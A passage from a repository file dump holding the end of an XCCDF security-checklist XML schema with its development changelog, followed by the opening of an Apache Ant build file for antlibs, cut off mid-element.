                <xsd:attribute name="name" type="xsd:anyURI" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A URI that indicates the name of the fact.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="type" type="cdf:valueTypeType" default="boolean" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The data type of the fact value.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="tailoringReferenceType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for the &lt;xccdf:tailoring&gt; element within an
                &lt;xccdf:TestResult&gt;. This element is used to indicate the identity and location
                of an &lt;xccdf:Tailoring&gt; file that was used to create the assessment results.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="href" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The URI of the &lt;xccdf:Tailoring&gt; file's
                    location. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="id" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The &lt;xccdf:Tailoring&gt; element's @id value.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="version" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the &lt;xccdf:Tailoring&gt; element's
                    &lt;xccdf:version&gt; property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="time" type="xsd:dateTime" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @time attribute in the
                    &lt;xccdf:Tailoring&gt; element's &lt;xccdf:version&gt;
                    property.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="ruleResultType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for the &lt;xccdf:rule-result&gt; element within
                an &lt;xccdf:TestResult&gt;. An &lt;xccdf:rule-result&gt; holds the result of
                applying an &lt;xccdf:Rule&gt; from the &lt;xccdf:Benchmark&gt; to a target system
                or component of a target system. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="result" type="cdf:resultEnumType" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Result of applying the referenced
                        &lt;xccdf:Rule&gt; to a target or target component. (E.g., Pass, Fail, etc.)
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="override" type="cdf:overrideType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">An XML block explaining how and why an auditor
                        chose to override the result. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="ident" type="cdf:identType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A long-term globally meaningful identifier for
                        the issue, vulnerability, platform, etc. copied from the referenced
                        &lt;xccdf:Rule&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">XML metadata associated with this
                        &lt;xccdf:rule-result&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="message" type="cdf:messageType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Diagnostic messages from the checking engine.
                        These elements do not affect scoring; they are present merely to convey
                        diagnostic information from the checking engine. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="instance" type="cdf:instanceResultType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Name of the target subsystem or component to
                        which this result applies, for a multiply instantiated &lt;xccdf:Rule&gt;.
                        The element is important for an &lt;xccdf:Rule&gt; that applies to
                        components of the target system, especially when a target might have several
                        such components, and where the @multiple attribute of the &lt;xccdf:Rule&gt;
                        is set to true.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="fix" type="cdf:fixType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Fix script for this target platform, if
                        available (would normally appear only for result values of “fail”). It is
                        assumed to have been ‘instantiated’ by the testing tool and any
                        substitutions or platform selections already made.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:choice>
                <xsd:element name="check" type="cdf:checkType" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Encapsulated or referenced results to
                            detailed testing output from the checking engine (if
                            any).</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="complex-check" minOccurs="0" type="cdf:complexCheckType"
                    maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A copy of the &lt;xccdf:Rule&gt; element’s
                            &lt;xccdf:complex-check&gt; element where each component
                            &lt;xccdf:check&gt; element of the &lt;xccdf:complex-check&gt; element
                            is an encapsulated or referenced results to detailed testing output from
                            the checking engine (if any) as described in the
                            &lt;xccdf:rule-result&gt; &lt;xccdf:check&gt;
                            property.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:choice>
        </xsd:sequence>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @id property of an
                    &lt;xccdf:Rule&gt;. This &lt;xccdf:rule-result&gt; reflects the result of
                    applying this &lt;xccdf:Rule&gt; to a target or target component.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="role" type="cdf:roleEnumType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @role property of the referenced
                    &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="severity" type="cdf:severityEnumType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @severity property of the
                    referenced &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="time" type="xsd:dateTime" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Time when application of this instance of the
                    referenced &lt;xccdf:Rule&gt; was completed. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="version" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @version property of the
                    referenced &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="weight" type="cdf:weightType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @weight property of the referenced
                    &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="instanceResultType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for an &lt;xccdf:instance&gt; element in an
                &lt;xccdf:rule-result&gt;. The content is a string, but the element may also have
                two attributes: @context and @parentContext. Both attributes are intended to provide
                hints as to the nature of the substituted content. This body of this type records
                the details of the target system instance for multiply instantiated
                &lt;xccdf:Rule&gt; elements. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="context" default="undefined" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Describes the scope or significance of the
                            instance content. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="parentContext" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Used to express nested structure in
                            instance context structures. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="overrideType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for an &lt;xccdf:override&gt; element in an
                &lt;xccdf:rule-result&gt;. This element is used to record manual modification or
                annotation of a particular &lt;xccdf:rule-result&gt;. All attributes and child
                elements are required. It will not always be the case that the
                &lt;xccdf:new-result&gt; value will differ from the &lt;xccdf:old-result&gt; value.
                They might match if an authority wished to make a remark on the result without
                changing it. If &lt;xccdf:new-result&gt; and &lt;xccdf:old-result&gt; differ, the
                &lt;xccdf:result&gt; element of the enclosing &lt;xccdf:rule-result&gt; must match
                the &lt;xccdf:new-result&gt; value.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="old-result" type="cdf:resultEnumType" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:rule-result&gt; status before
                        this override. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="new-result" type="cdf:resultEnumType" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The new, override &lt;xccdf:rule-result&gt;
                        status. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="remark" type="cdf:textType" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Rationale or explanation text for why or how
                        the override was applied. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="time" type="xsd:dateTime" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">When the override was applied. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="authority" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Name or other identification for the human
                    principal authorizing the override. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="messageType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for a message generated by the checking engine or
                XCCDF tool during &lt;xccdf:Benchmark&gt; testing. The message is contained in
                string format in the body of the element. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="severity" type="cdf:msgSevEnumType" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Denotes the seriousness of the
                            message.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:simpleType name="msgSevEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Allowed values to indicate the severity of messages
                from the checking engine. These values don't affect scoring themselves but are
                present merely to convey diagnostic information from the checking engine. Benchmark
                consumers may choose to log these messages or display them to the user.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="error">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Denotes a serious problem identified; test did
                        not run. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="warning">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Denotes a possible issue; test may not have
                        run. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="info">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Denotes important information about the tests.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="resultEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Allowed result indicators for a
                test.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="pass">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The target system or system component satisfied
                        all the conditions of the &lt;xccdf:Rule&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="fail">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The target system or system component did not
                        satisfy all the conditions of the &lt;xccdf:Rule&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="error">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The checking engine could not complete the
                        evaluation; therefore the status of the target’s compliance with the
                        &lt;xccdf:Rule&gt; is not certain. This could happen, for example, if a
                        testing tool was run with insufficient privileges and could not gather all
                        of the necessary information. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="unknown">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The testing tool encountered some problem and
                        the result is unknown. For example, a result of ‘unknown’ might be given if
                        the testing tool was unable to interpret the output of the checking engine
                        (the output has no meaning to the testing tool). </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="notapplicable">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; was not applicable to
                        the target of the test. For example, the &lt;xccdf:Rule&gt; might have been
                        specific to a different version of the target OS, or it might have been a
                        test against a platform feature that was not installed. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="notchecked">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; was not evaluated by the
                        checking engine. This status is designed for &lt;xccdf:Rule&gt; elements
                        that have no check. It may also correspond to a status returned by a
                        checking engine if the checking engine does not support the indicated check
                        code. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="notselected">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; was not selected in the
                        &lt;xccdf:Benchmark&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="informational">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; was checked, but the
                        output from the checking engine is simply information for auditors or
                        administrators; it is not a compliance category. This status value is
                        designed for &lt;xccdf:Rule&gt; elements whose main purpose is to extract
                        information from the target rather than test the target.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="fixed">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; had failed, but was then
                        fixed (possibly by a tool that can automatically apply remediation, or
                        possibly by the human auditor). </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="severityEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Allowed severity values for the @severity attribute of
                an &lt;xccdf:Rule&gt;. The value of this attribute provides an indication of the
                importance of the &lt;xccdf:Rule&gt; element's recommendation. This information is
                informative only and does not affect scoring.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="unknown">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Severity not defined (default).
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="info">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">&lt;xccdf:Rule&gt; is informational and failure
                        does not represent a problem. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="low">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Not a serious problem. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="medium">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Fairly serious problem. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="high">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A grave or critical problem.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="roleEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Allowed checking and scoring roles for an
                &lt;xccdf:Rule&gt;.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="full">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">If the &lt;xccdf:Rule&gt; is selected, then
                        check it and let the result contribute to the score and appear in reports
                        (default). </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="unscored">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">If the &lt;xccdf:Rule&gt; is selected, then
                        check it and include it in the test report, but give the result a status of
                        informational and do not use the result in score computations.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="unchecked">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Do not check the &lt;xccdf:Rule&gt;; just force
                        the result status to notchecked. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="subUseEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">This holds the possible values of the @use attribute
                within an &lt;xccdf:sub&gt; element. The @use attribute is only applicable with the
                subType's @idref attribute holds the value of the @id of an &lt;xccdf:Value&gt;
                element.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="value">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Replace with the selected &lt;xccdf:value&gt;
                        or &lt;xccdf:complex-value&gt; of an &lt;xccdf:Value&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="title">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Replace with the &lt;xccdf:title&gt; of the
                        &lt;xccdf:Value&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="legacy">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Use the context-dependent processing of
                        &lt;xccdf:sub&gt; elements outlined in XCCDF 1.1.4. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:element name="Tailoring" type="cdf:tailoringType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The &lt;xccdf:Tailoring&gt; element holds one or more
                &lt;xccdf:Profile&gt; elements. These &lt;xccdf:Profile&gt; elements record
                additional tailoring activities that apply to a given &lt;xccdf:Benchmark&gt;.
                &lt;xccdf:Tailoring&gt; elements are separate from &lt;xccdf:Benchmark&gt;
                documents, but each &lt;xccdf:Tailoring&gt; element is associated with a specific
                &lt;xccdf:Benchmark&gt; document. By defining these tailoring actions separately
                from the &lt;xccdf:Benchmark&gt; document to which they apply, these actions can be
                recorded without affecting the integrity of the source itself.</xsd:documentation>
        </xsd:annotation>
    </xsd:element>

    <xsd:complexType name="tailoringType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Data type for the &lt;xccdf:Tailoring&gt; element. The
                &lt;xccdf:Tailoring&gt; element allows named tailorings (i.e., &lt;xccdf:Profile&gt;
                elements) of an &lt;xccdf:Benchmark&gt; to be defined separately from the
                &lt;xccdf:Benchmark&gt; itself. The &lt;xccdf:Profile&gt; elements in an
                &lt;xccdf:Tailoring&gt; element can be used in two ways: First, an organization
                might wish to pre-define a set of tailoring actions to be applied on top of or
                instead of the tailoring performed by an &lt;xccdf:Benchmark&gt; element's
                &lt;xccdf:Profile&gt; elements. Second, an &lt;xccdf:Tailoring&gt; element can be
                used to record manual tailoring actions performed during the course of an
                assessment. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="benchmark" minOccurs="0" maxOccurs="1"
                type="cdf:tailoringBenchmarkReferenceType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Identifies the &lt;xccdf:Benchmark&gt; to which
                        this tailoring applies. A &lt;xccdf:Tailoring&gt; document is only
                        applicable to a single &lt;xccdf:Benchmark&gt;. Note, however, that this is
                        a purely informative field. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element ref="cdf:status" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Status of the tailoring and date at which it
                        attained that status. Authors may use this element to record the maturity or
                        consensus level of an &lt;xccdf:Tailoring&gt; element.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="dc-status" minOccurs="0" maxOccurs="unbounded"
                type="cdf:dc-statusType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Holds additional status information using the
                        Dublin Core format. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="version" minOccurs="1" maxOccurs="1" type="cdf:tailoringVersionType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The version of this &lt;xccdf:Tailoring&gt;
                        element, with a required @time attribute that records when the
                        &lt;xccdf:Tailoring&gt; element was created. This timestamp is necessary
                        because, under some circumstances, a copy of an &lt;xccdf:Tailoring&gt;
                        document might be automatically generated. Without the version and
                        timestamp, tracking of these automatically created &lt;xccdf:Tailoring&gt;
                        documents could become problematic. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">XML metadata for the &lt;xccdf:Tailoring&gt;
                        element. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element ref="cdf:Profile" minOccurs="1" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">&lt;xccdf:Profile&gt; elements that reference
                        and customize sets of items in an &lt;xccdf:Benchmark&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="signature" type="cdf:signatureType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A digital signature asserting authorship and
                        allowing verification of the integrity of the &lt;xccdf:Tailoring&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="id" type="cdf:tailoringIdType" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Unique identifier for this
                    element.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <!-- the 'Id' attribute is needed for XML-Signature -->
        <xsd:attribute name="Id" type="xsd:ID" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier used for referencing elements
                    included in an XML signature. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="tailoringBenchmarkReferenceType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Identifies the &lt;xccdf:Benchmark&gt; to which an
                &lt;xccdf:Tailoring&gt; element applies. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:benchmarkReferenceType">
                <xsd:attribute name="version" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Identifies the version of the referenced
                            &lt;xccdf:Benchmark&gt;. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:complexType name="tailoringVersionType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for version information about an
                &lt;xccdf:Tailoring&gt; element. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="time" type="xsd:dateTime" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The time when this version of the
                            &lt;xccdf:Tailoring&gt; document was completed. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

</xsd:schema>
<!-- CHANGELOG

 date           change                  remarks

6/20/05         added cdf:ident         long-term identifiers for Rule
                                        and rule-result.

6/21/05         enhanced version        added version attr to TestResult
                                        and rule-result, too

                added notapplicable     added new rule result value

                added severity          enum and attributes

6/22/05         added signatures for    need for standalone Rules & such
                Rule,Group,Value,
                Profile,TestResult

6/22/05         added rule roles        at Dave's request

6/23/05         added rule result       at DISA request
                overrides

6/26/05         added fixtext and       enums for attributes
                fix enhancements

6/29/05         added interactive       run-time tailoring for Values
                attr on Value object

6/29/05         added multiple scoring  was this a Dave request?
                model support

7/1/05          added support for       to support text re-use
                named plain text blocks

7/7/05          added target-facts      DISA suggestion

7/13/05         added complex-checks    workshop suggestion, allow
                                        boolean combinations of 
                                        checks.

7/29/05         added more rule         some suggested by CIS
                result types

8/4/05          added override attrs    suggested by Dave W.
                for managing inheritance

8/20/05         added fix strategies

8/20/05         revamped complex-check  see OVAL schema
                to more closely match
                OVAL boolean operators

9/4/05          fixed some typos

9/8/05          Added fix/fixtext       suggested by Dave W.
                complexity and warning
                categories.

9/18/05         Allow for XCCDF-P as    see XCCDF-P document
                a platform type.        (later deprecated)

9/21/05         Added profile-note      suggested by Dave W.
                support.

11/10/05        Added additional features   also from Dave W.
                for Values.

11/27/05        Added instance context   to meet CIS req'ts
                support

11/27/05        Added multiple hint on   to meet CIS req'ts
                Rule object

11/27/05        fixed role attr on       old bug
                Rule object

12/5/05         fixed 1.0-incompatible    reported by Nancy W
                order glitch in Profile

4/16/06         beginning work toward     reports from Ian C
                1.1bis; fixed several 
                small mistakes/glitches.

4/23/06         tweaked formatting        various e-mails
                fixed some comments
                version # to 1.1.2.1

4/30/06         fixed plain-text id       report from Dave W.
                key and sub key ref

5/5/06          fixed extends keyrefs     report from Dave W.

5/21/06         added id attribute to     request from CIS
                check element

8/27/06         changed TestResult to     bug discovered myself
                allow target to appear
                multiple times

11/20/06        Fixed weightType          report from Gary Gapinski

12/13/06        Changed platform          support for CPE
                references to URIs

12/13/06        Changed requires element  request from NIST
                to a token list

12/28/06        Changed check element to   backfit to NIST 
                allow multiple            change by Linda Devlin
                check-content-ref

8/21/07         Added check-import        better reporting, req.
                element                   by NIST & MITRE

8/26/07         Added remark element      allow authors to add
                to Profile selectors      rationale to Profiles

8/26/07         Added weight to rule      record weight used in
                result element            a benchmark run

8/30/07         Added impact-metric       mechanism to include a
                element to Rule           CVSS score in a Rule

8/30/07         Changed CPE support       Match SCAP 1.0
                to CPE 2.0
9/10/07         Made CPE 1.0 deprecated   Match SCAP 1.0

10/8/07         Allow Profile selectors   Part of clarifying Profile
                in any order              semantics for 1.1.4

10/8/07         Added Benchmark style     For NIST SCAP
                and style-href attrs

10/8/07         Added organization and    For NIST SCAP
                identity elements for
                TestResult

6/1/10          Made platform element       Fix to match spec
                Profile overridable
               
6/1/10          Added metadata fields       Community request for
                to TestResults, Profiles    more flexible metadata
                and Items. Also opened
                metadata fields to all
                content.

6/1/10          Updated to use CPE 2.3      Bring into line with SCAP
                Also changed CPE fields
                from URIs to strings.
                
6/1/10          Added negate field to       Support inverting of SCAP
                check element.              result mappings

6/1/10          Added dc-status field       Allow Dublin-Core status info

6/1/10          Added multi-check to        Allows creation of rule-results
                Rules                       for each check used

6/1/10          Expanded selector           Enforce requirements from spec 
                uniqueness constraints 
                within Values
                
6/1/10          Expanded Value to           Bring XCCDF more in line with
                allow lists and externally  capabilities of checking languages
                defined types. Updated
                Profile selectors and
                TestResults to handle the
                new constructs

6/1/10          Added import-xpath to       Expand import capabilities
                check-import. Also updated
                check-import to allow
                XML-structured findings
                
6/1/10          Fixed path of Benchmark's   Bug fix.
                profileIdKeyRef restriction
                
6/1/10          Added an id field to        Better reference to the XCCDF source 
                TestResult/benchmark
                
5/27/11         Added reference to Asset    More standards based target identification 
                Identification structures
                in TestResults.
                
5/27/11         Added ComplexChecks in      Better tracking of result structures during complex checks 
                rule-results
-->
</file>

<file path="sample_data/test_files/small/ant/ant-antlibs-common-build.xml">
<?xml version="1.0"?>
<!--
   Licensed to the Apache Software Foundation (ASF) under one or more
   contributor license agreements.  See the NOTICE file distributed with
   this work for additional information regarding copyright ownership.
   The ASF licenses this file to You under the Apache License, Version 2.0
   (the "License"); you may not use this file except in compliance with
   the License.  You may obtain a copy of the License at

       https://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
-->
<project name="common" xmlns:ivy="antlib:org.apache.ivy.ant">

  <dirname property="common.basedir" file="${ant.file.common}"/>
  <import file="${common.basedir}/common-tasks.xml"/>
  
  <available property="with.ivy" file="ivy.xml"/>

  <target name="setup-properties">
    <!-- load optional antlib specific configuration -->
    <property file="build.properties"/>
    <!--load in an optional file containing versions of things-->
    <property file="version.properties"/>
    
    <!-- load common configuration -->
    <property file="${common.basedir}/build.properties"/>
    
    <!--load in a file containing versions of ant
      and other libraries-->
    <property file="${ant.home}/lib/libraries.properties"/>

    <!-- javac properties -->
    <property name="javac.test-source" value="${javac.-source}"/>
    <property name="javac.test-target" value="${javac.-target}"/>

    <tstamp>
      <format property="artifact.publication.datetime" pattern="yyyyMMddHHmmss"/>
    </tstamp>
  </target>

  <target name="setup" depends="setup-properties">
    <mkdir dir="${build.classes}"/>
    <mkdir dir="${build.testclasses}"/>
    <mkdir dir="${build.lib}"/>
    <copy file="${common.basedir}/style.css" todir="docs"/>
  </target>

  <!--Milestones to extend or override-->
  <target name="ready-to-compile" depends="setup"/>
  <target name="ready-to-test-with-junit" depends="compile-tests"/>
  <target name="ready-to-test-with-antunit" depends="setup-for-antunit-tests"/>
  <target name="ready-to-package" depends="compile"/>
  <target name="ready-to-distribute" depends="antlib"/>
  <target name="package" depends="checksum-target-jar"
       description="Package everything up"/>

  <target name="compile" depends="setup,resolve">
    <javac 
      srcdir="src/main"
      destdir="${build.classes}"
      debug="${javac.debug}"
      source="${javac.-source}"
      target="${javac.-target}"
      includeantruntime="true"
      classpathref="classpath.compile"
